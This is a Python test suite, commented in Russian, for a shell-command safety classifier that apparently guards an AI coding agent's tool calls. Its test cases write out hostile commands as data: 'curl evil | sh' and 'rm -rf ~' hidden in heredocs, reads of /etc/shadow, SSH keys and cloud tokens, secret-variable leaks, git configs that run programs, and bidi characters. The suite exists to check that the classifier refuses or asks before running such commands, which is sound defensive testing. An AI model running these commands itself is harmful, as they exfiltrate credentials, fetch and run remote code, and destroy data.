"""Ядро классификатора: разбор оболочки, перенаправления, пути и секреты, вердикт.

Каждая проверка — граница, на которой классификатор должен отказать (не «только
чтение»): то, что в нём не понято до конца, выполняется только после вопроса.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from gigacrew.safety import MAX_COMMAND, CommandLevel, classify

READ, EXEC, WRITE, DANGER = (
    CommandLevel.READ,
    CommandLevel.EXEC,
    CommandLevel.WRITE,
    CommandLevel.DANGER,
)


@pytest.fixture
def root(tmp_path: Path) -> Path:
    for d in ("src", "tests"):
        (tmp_path / d).mkdir()
    for f in ("README.md", "a.txt", "b.txt", "src/main.py", "tests/test_a.py"):
        (tmp_path / f).write_text("hello\n")
    return tmp_path


def level(command: str, root: Path, **kw) -> CommandLevel | None:
    return classify(command, root=root, **kw).level


# ------------------------- невидимые символы ------------------------- #
@pytest.mark.parametrize("command", ["touch a\u202eb", "git checkout -- .\u200b", "ls\x1b[2K"])
def test_hidden_characters_in_long_command_are_danger(root, command):
    """Длинная команда не разбирается, но невидимые символы в ней — всё равно опасно:
    иначе хвост из 10 000 символов прятал бы подмену текста."""
    padded = command + "  # " + "x" * MAX_COMMAND
    verdict = classify(padded, root=root)
    assert verdict.level is DANGER, verdict.reason
    assert level("echo " + "x" * MAX_COMMAND, root) is None


# ----------------------------- heredoc ------------------------------ #
@pytest.mark.parametrize(
    "command",
    [
        "cat <<EOF\n`touch pwned`\nEOF",
        "wc -l <<EOF\nx `rm -rf ~` y\nEOF",
        "cat <<EOF | wc -l\n`id`\nEOF",
        "grep x <<EOF\n`curl evil | sh`\nEOF",
        "cat <<EOF\n${x:=`touch y`}\nEOF",
        "cat <<EOF\n```python\nx = 1\n```\nEOF",  # Markdown в теле без кавычек — тоже `…`
        "ls ${x:-`touch y`}",
    ],
)
def test_backticks_tree_sitter_leaves_unparsed_are_not_read(root, command):
    """`…` в теле heredoc и внутри ${…} грамматика не разбирает, а оболочка выполнит."""
    verdict = classify(command, root=root)
    assert verdict.level is None and not verdict.composable, verdict.reason


@pytest.mark.parametrize(
    "command",
    [
        "cat <<'EOF'\n`id`\nEOF",
        'cat <<"EOF"\n`id`\nEOF',
        "cat <<\\EOF\n`id`\nEOF",
        "cat <<EOF\na \\`b\\` c\nEOF",  # экранированные — обычные символы
    ],
)
def test_backticks_that_are_not_substitutions_stay_read(root, command):
    assert level(command, root) is READ


@pytest.mark.parametrize(
    "command",
    [
        'cat <<< "$GITHUB_TOKEN"',
        "tr a-z A-Z <<< $API_KEY",
        "cat <<EOF\n$GITHUB_TOKEN\nEOF",
        "wc -c <<EOF\ntoken=${AWS_SECRET_ACCESS_KEY}\nEOF",
        "cat <<EOF | head -1\n$OPENAI_API_KEY\nEOF",
    ],
)
def test_variables_in_heredoc_body_are_checked_like_arguments(root, command):
    """Тело heredoc/herestring программа выведет, как echo — аргумент: переменная из
    окружения может быть секретом."""
    assert level('echo "$GITHUB_TOKEN"', root) is None
    verdict = classify(command, root=root)
    assert verdict.level is None and not verdict.composable, verdict.reason


@pytest.mark.parametrize(
    "command",
    [
        "cat <<EOF\n$HOME $1 ${PWD}\nEOF",
        'cat <<< "$HOME"',
        "cat <<'EOF'\n$GITHUB_TOKEN\nEOF",  # разделитель в кавычках: подстановок нет
        "cat <<EOF\nprice \\$GITHUB_TOKEN\nEOF",  # \$ — просто знак доллара
    ],
)
def test_heredoc_body_without_secret_variables_stays_read(root, command):
    assert level(command, root) is READ


@pytest.mark.parametrize(
    "command",
    [
        "TZ=UTC; echo $TZ",
        'LC_ALL="C.UTF-8"; echo "${LC_ALL}"',
        "export TZ=Europe/Moscow\necho $TZ",
        "DEBUG=1; TZ=UTC; echo $DEBUG$TZ",
        "TZ=$GITHUB_TOKEN; TZ=UTC; echo $TZ",  # последнее присваивание — постоянное
        "TZ=UTC\ncat <<EOF\n$TZ\nEOF",
    ],
)
def test_variable_assigned_earlier_to_a_static_value_is_not_a_secret(root, command):
    """Переменная, которой команда сама раньше присвоила постоянное значение, — не секрет
    из окружения: вывести её можно без вопроса (присваивать — только безвредные имена,
    другие меняют окружение следующих команд)."""
    assert level("TZ=UTC; echo hi", root) is READ
    assert level("echo $TZ", root) is None
    verdict = classify(command, root=root)
    assert verdict.level is READ, verdict.reason


@pytest.mark.parametrize(
    "command",
    [
        "echo $TZ; TZ=UTC",  # присвоено позже
        "TZ=UTC echo $TZ",  # префикс: $TZ раскрывается до присваивания
        "TZ=$GITHUB_TOKEN; echo $TZ",  # значение — из окружения
        "TZ=UTC; TZ=$GITHUB_TOKEN; echo $TZ",  # переприсвоено
        "false && TZ=UTC; echo $TZ",  # присваивание могло не выполниться
        "false || TZ=UTC; echo $TZ",
        "(TZ=UTC); echo $TZ",  # в подоболочке: снаружи не видно
        "TZ=UTC | true; echo $TZ",  # звено конвейера — тоже подоболочка
        "echo $(TZ=UTC); echo $TZ",
        "TZ=GITHUB_TOKEN; echo ${!TZ}",  # косвенная ссылка: значение другой переменной
        "TZ=GITHUB_TOKEN; echo $((TZ))",  # арифметика вычисляет переменную по имени
        "TZ=GITHUB_TOKEN; echo $(($TZ + 1))",
        "TZ='$(cat .env)'; echo ${TZ@P}",  # @P выполняет подстановки
        "TZ=GITHUB_TOKEN; echo ${TZ:-$GITHUB_TOKEN}",
        "TZ='*'; echo $TZ",  # шаблон имён файлов
        "TZ='$GITHUB_TOKEN'; eval echo $TZ",
        "TZ=UTC; sh -c 'echo $TZ'",  # другой процесс: переменная — из окружения
        # Префикс у специальной встроенной команды (:) в dash остаётся в оболочке.
        "TZ=UTC; TZ=$GITHUB_TOKEN :; echo $TZ",
        # Встроенные команды, которые присваивают переменные сами.
        "TZ=UTC; read TZ < a.txt; echo $TZ",
        "TZ=UTC; getopts ab TZ; echo $TZ",
        "TZ=UTC; printf -v TZ %s x; echo $TZ",
    ],
)
def test_assigned_variable_is_trusted_only_when_certainly_static(root, command):
    verdict = classify(command, root=root)
    assert verdict.level is not READ, verdict.reason


# ------------------------ рекурсивное чтение ------------------------ #
@pytest.mark.parametrize(
    "secret",
    [
        "build/.env",
        "dist/.env",
        "node_modules/p/credentials.json",
        "node_modules/p/.npmrc",
        ".venv/lib/.env",
        ".tox/py/id_rsa",
        ".gigacode/.env",
    ],
)
def test_recursive_read_sees_secrets_in_service_dirs(root, secret):
    """grep -r и find не пропускают build, node_modules, .venv: секреты там прочитаются."""
    (root / secret).parent.mkdir(parents=True, exist_ok=True)
    (root / "build").mkdir(exist_ok=True)
    (root / "build" / "out.txt").write_text("hello\n")
    assert level("grep -rn hello .", root) is READ
    (root / secret).write_text("TOKEN=1\n")
    assert level("grep -rn hello .", root) is None
    assert level("find . -type f -exec cat {} +", root) is None


@pytest.mark.parametrize("directory", ["build", "node_modules/p", ".venv"])
def test_recursive_read_sees_escaping_links_in_service_dirs(root, directory):
    (root / directory).mkdir(parents=True)
    assert level("grep -Rn hello .", root) is READ
    (root / directory / "lnk").symlink_to(Path.home())
    assert level("grep -Rn hello .", root) is None


# ------------------------- рабочий каталог -------------------------- #
@pytest.fixture
def two_makefiles(root: Path) -> Path:
    (root / "vendor" / "x").mkdir(parents=True)
    for d in (root, root / "vendor" / "x"):
        (d / "Makefile").write_text("test:\n\techo ok\n")
        (d / "run.sh").write_text("#!/bin/sh\necho ok\n")
        (d / "run.sh").chmod(0o755)
    return root


@pytest.mark.parametrize("command", ["make test", "./run.sh --fast"])
def test_cd_inside_subshell_is_not_matched_by_rule_for_other_directory(two_makefiles, command):
    """`(cd X && …)` выполняется в X, а Verdict.cwd остаётся корнем: по частям такую
    команду с разрешениями не сверить, иначе правило корня сработало бы в X."""
    from gigacrew.agent.decisions import DecisionMemory

    root = two_makefiles
    memory = DecisionMemory()
    assert memory.approve(classify(command, root=root))
    assert memory.match(classify(command, root=root)) is not None
    sub = classify(f"(cd vendor/x && {command})", root=root)
    assert sub.cwd == "." and sub.composable is False
    assert memory.match(sub) is None
    top = classify(f"cd vendor/x && {command}", root=root)
    assert top.cwd == "vendor/x" and top.composable is True
    assert memory.match(top) is None
    # тот же каталог — по-прежнему по частям
    assert classify(f"(cd . && {command})", root=root).composable is True


# ------------------------- только правки ---------------------------- #
def test_edits_only_requires_every_part_and_every_redirect_to_be_an_edit(root):
    """edits_only даёт ToolKind.EDIT — в режиме «авто» без вопроса при любом риске."""
    (root / ".env").write_text("T=1\n")
    assert classify("ls > files.txt", root=root).edits_only
    assert classify("sed -i s/a/b/ a.txt && ls", root=root).edits_only
    # перезапись файла с секретами — не правка, как и `cp a.txt .env`
    assert not classify("cp a.txt .env", root=root).edits_only
    assert not classify("cat a.txt > .env", root=root).edits_only
    assert not classify("ls >> .env", root=root).edits_only
    # правка вместе с не-правкой (T1-S1)
    assert not classify("ruff format . && rm a.txt", root=root).edits_only
    assert not classify("sed -i s/a/b/ a.txt && pip install x", root=root).edits_only
    # только уровень WRITE (T1-S2): опасное и «не знаю» — не правки
    danger = classify("sed -i 's/a/b/' a.txt > ../x", root=root)
    assert danger.level is DANGER and not danger.edits_only
    unknown = classify("sed -i 's/a/b/' a.txt > $OUT", root=root)
    assert unknown.level is None and not unknown.edits_only


def test_cd_followed_by_newline_is_not_a_working_directory(root):
    """Перевод строки после cd — как «;»: следующая команда выполнится и там, где cd
    не сработал (T1-U7)."""
    for sep in ("; ", "\n"):
        verdict = classify(f"cd src{sep}cat ../a.txt", root=root)
        assert verdict.cwd == "." and verdict.level is None, verdict.reason
    assert classify("cd src && cat ../a.txt", root=root).level is READ
    only = classify("cd src", root=root)
    assert only.cwd == "src" and only.command == ""
    assert classify("cd src\n", root=root).cwd == "src"


def test_problems_make_command_not_composable(root):
    """Фон и циклы — не части для сверки: разрешение `pytest` не распространяется на
    `pytest &` и цикл (T1-S14)."""
    from gigacrew.agent.decisions import DecisionMemory

    memory = DecisionMemory()
    assert memory.approve(classify("pytest", root=root))
    for command in ("pytest &", "while true; do pytest; done"):
        verdict = classify(command, root=root)
        assert verdict.level is None and verdict.composable is False, command
        assert memory.match(verdict) is None, command


# ----------------------- невидимые символы -------------------------- #
@pytest.mark.parametrize(
    "ch", ["\r", "\x0b", "\x0c", "\x7f", "\x9b", "\u2066", "\u2067", "\u2069", "\ufeff"]
)
def test_control_and_bidi_characters_are_danger(root, ch):
    """Возврат каретки, C1, изоляция направления (Trojan Source), BOM (T1-S17, T1-S18)."""
    assert classify(f"echo ok{ch}x", root=root).level is DANGER
    assert classify(f"cat a.txt {ch}", root=root).level is DANGER


def test_invisible_chars_lists_code_points():
    from gigacrew.safety import invisible_chars

    assert invisible_chars("a\tb\nc") == []
    assert invisible_chars("a\u202eb\u202e") == ["U+202E"]
    assert invisible_chars("x\u2067y\u2069") == ["U+2067", "U+2069"]


# -------------------------- перенаправления ------------------------- #
@pytest.fixture
def repo(root: Path) -> Path:
    subprocess.run(["git", "init", "-q"], cwd=root, check=True)
    return root


@pytest.mark.parametrize("op", [">", ">>", ">|", "&>", "&>>", ">&"])
def test_output_redirect_operators_write(repo, op):
    """Каждый оператор вывода в файл — запись: в проекте WRITE, снаружи и в .git — DANGER
    (T1-S4, T1-S5)."""
    assert level(f"echo x {op} out.txt", repo) is WRITE
    assert level(f"echo x {op} ~/.bashrc", repo) is DANGER
    assert level(f"echo x {op} ../outside.txt", repo) is DANGER
    assert level(f"echo x {op} .git/config", repo) is DANGER


@pytest.mark.parametrize(
    "command",
    ["ls >&2", "ls 2>&1", "ls 1>&2", "ls > /dev/null 2>&1", "ls 2>/dev/null"],
)
def test_descriptor_duplication_is_not_a_write(root, command):
    verdict = classify(command, root=root)
    assert verdict.level is READ and verdict.composable, verdict.reason


def test_read_redirect_paths_are_checked(root):
    """`<` — чтение файла: те же проверки пути, что у аргументов cat (T1-S3)."""
    (root / ".env").write_text("T=1\n")
    assert level("cat < a.txt", root) is READ
    assert level("cat < ~/.ssh/id_rsa", root) is DANGER
    assert level("cat < ../outside.txt", root) is None
    assert level("cat < .env", root) is None
    assert level("wc -l < $FILE", root) is None


# ------------------------ конструкции оболочки ----------------------- #
def test_unknown_statement_types_fail_closed(root):
    """Незнакомый правилам разбора оператор — проблема, а не пустая команда (T1-S6)."""
    assert level("for ((i=0;i<1;i++)); do rm -rf src; done", root) is not READ
    verdict = classify("for ((i=0;i<1;i++)); do ls; done", root=root)
    assert verdict.level is None and not verdict.composable, verdict.reason


@pytest.mark.parametrize(
    "command",
    ["ls )", "ls 'x", "echo $(ls", "if true; then ls", "cat a.txt; )", "(ls", "(cat a.txt"],
)
def test_syntax_errors_fail_closed(root, command):
    """Неразобранная команда — «не знаю» и не сверяется по частям (T1-S21, T1-U8)."""
    verdict = classify(command, root=root)
    assert verdict.level is None and not verdict.composable, verdict.reason


def test_ansi_c_string_is_dynamic(root):
    """`$'…'` dash и bash понимают по-разному: путь неизвестен (T1-S15)."""
    assert level(r"cat $'\x2e\x2e/outside.txt'", root) is None
    assert level("cat $'a.txt'", root) is not READ


def test_backticks_in_heredoc_make_body_dynamic(root):
    """Тело heredoc с `…` или $ без кавычек у разделителя — не статичное: интерпретатор
    получит результат подстановки (T1-S16)."""
    from gigacrew.safety import bash as shell

    for command, static in [
        ("cat <<EOF\n`id`\nEOF", False),
        ("cat <<EOF\nplain $\nEOF", False),
        ("cat <<'EOF'\n`id`\nEOF", True),
        ("cat <<EOF\nplain\nEOF", True),
    ]:
        script = shell.parse(command, root=root)
        assert script is not None
        doc = script.commands[0].heredoc
        assert doc is not None and doc.body_static is static, command
    assert level("python3 <<EOF\nprint('`touch pwned`')\nEOF", root) is not READ


# ------------------------------ пути -------------------------------- #
def test_globs_take_the_worst_match(root):
    """Шаблон — худшее из совпадений: ключ среди файлов делает `cat *` не чтением
    (T1-S10, T1-U10)."""
    assert level("cat *.txt", root) is READ
    (root / "id_rsa").write_text("k")
    (root / "k.pem").write_text("k")
    assert level("cat *", root) is None
    assert level("cat *.pem", root) is None
    assert level("cat ~/.ssh/id_*", root) is DANGER
    assert level("cat /etc/*.conf", root) is None


def test_too_many_glob_matches_is_unknown(root, monkeypatch):
    monkeypatch.setattr("gigacrew.safety.paths.MAX_GLOB_MATCHES", 1)
    assert level("cat *.txt", root) is None


@pytest.mark.parametrize("command", ["cat /proc/self/environ", "strings /proc/1/environ"])
def test_process_environment_is_secret_outside(root, command):
    """Окружение процессов — секреты вне проекта: DANGER, не просто «снаружи» (T1-S19)."""
    assert level(command, root) is DANGER


def test_recursive_read_sees_symlinked_directories_out_of_project(root):
    """Каталог-ссылка за пределы проекта (не на секреты) — grep -R пойдёт по ней (T1-S7)."""
    assert level("grep -Rn hello .", root) is READ
    (root / "src" / "home").symlink_to(Path.home())
    assert level("grep -Rn hello .", root) is None
    assert level("grep -rn hello src", root) is None
    assert level("grep -rn hello tests", root) is READ


def test_recursive_read_sees_nested_secret_dirs(root):
    """.ssh, .aws… в глубине дерева — секреты, даже с безобидными именами файлов (T1-S8)."""
    (root / "x" / ".ssh").mkdir(parents=True)
    (root / "x" / ".ssh" / "known").write_text("k")
    assert level("grep -rn hello .", root) is None
    assert level("grep -rn hello src", root) is READ


def test_recursive_read_sees_credentials_in_git_remote(repo):
    """Токен в адресе удалённого репозитория (.git/config) — секрет (T1-S9)."""
    assert level("grep -rn hello .", repo) is READ
    url = "https://u:tok123@example.com/r.git"
    subprocess.run(["git", "remote", "add", "origin", url], cwd=repo, check=True)
    assert level("grep -rn hello .", repo) is None
    assert level("grep -rn hello src", repo) is READ


def test_secret_walk_overflow_counts_as_secret(root):
    """Дерево больше лимита — считаем, что секреты в нём есть (T1-S20)."""
    from gigacrew.safety.paths import has_escaping_links, has_secrets_under

    d = root / "big"
    (d / "z").mkdir(parents=True)
    for i in range(10):
        (d / f"f{i}.txt").write_text("x")
    assert has_secrets_under(d, root) is False
    assert has_secrets_under(d, root, limit=5) is True
    assert has_escaping_links(d, root, limit=5) is True


# ------------------------------- git -------------------------------- #
@pytest.mark.parametrize(
    "key, value",
    [
        ("core.fsmonitor", "./fsmon.sh"),
        ("filter.x.clean", "sh -c id"),
        ("filter.x.smudge", "sh -c id"),
        ("filter.x.process", "sh -c id"),
        ("diff.external", "sh -c id"),
        ("diff.x.command", "sh -c id"),
        ("diff.x.textconv", "sh -c id"),
        ("gpg.program", "sh -c id"),
        ("gpg.ssh.program", "sh -c id"),
    ],
)
def test_git_read_with_program_in_repo_config_asks(repo, key, value):
    """Чтение git — READ, только пока настройки репозитория не запускают программ
    (T1-S11, T1-S12)."""
    from gigacrew.safety.gitconfig import repo_config_runs_programs

    assert level("git status", repo) is READ
    subprocess.run(["git", "config", key, value], cwd=repo, check=True)
    assert repo_config_runs_programs(repo) is True
    assert level("git status", repo) is None
    assert level("env -i git status", repo) is None


def test_git_fsmonitor_disabled_and_global_config_are_fine(repo):
    """core.fsmonitor=false ничего не запускает; глобальные настройки — пользователя,
    их не проверяем (HOME в тестах — временный)."""
    from gigacrew.safety.gitconfig import repo_config_runs_programs

    subprocess.run(["git", "config", "core.fsmonitor", "false"], cwd=repo, check=True)
    assert repo_config_runs_programs(repo) is False
    assert level("git status", repo) is READ
    subprocess.run(["git", "config", "--global", "diff.external", "x"], cwd=repo, check=True)
    assert repo_config_runs_programs(repo) is False


def test_git_config_that_cannot_be_read_is_unknown(repo):
    """git не прочитал настройки — неизвестно, что запустится (T1-S13)."""
    from gigacrew.safety.gitconfig import repo_config_runs_programs

    (repo / ".git" / "config").write_text("[core\n broken")
    assert repo_config_runs_programs(repo) is None
    assert level("git status", repo) is None


@pytest.mark.parametrize(
    "command",
    [
        "cat /etc/shadow",
        "cat /etc/gshadow-",
        "cat /etc/sudoers",
        "cat /etc/ssh/ssh_host_ed25519_key",
        "cat ~/.config/gh/hosts.yml",
        "cat ~/.config/gcloud/application_default_credentials.json",
        "head ~/.config/gcloud/access_tokens.db",
    ],
)
def test_well_known_credential_files_outside_project_are_danger(root, command):
    """Пароли системы, ключи хоста ssh, токены gh и gcloud — секреты вне проекта."""
    assert level(command, root) is DANGER


def test_ordinary_files_outside_project_stay_unknown(root):
    assert level("cat /etc/hosts", root) is None
    assert level("cat ~/.config/gh/config.yml", root) is None
    assert level("cat /etc/ssh/ssh_host_ed25519_key.pub", root) is None
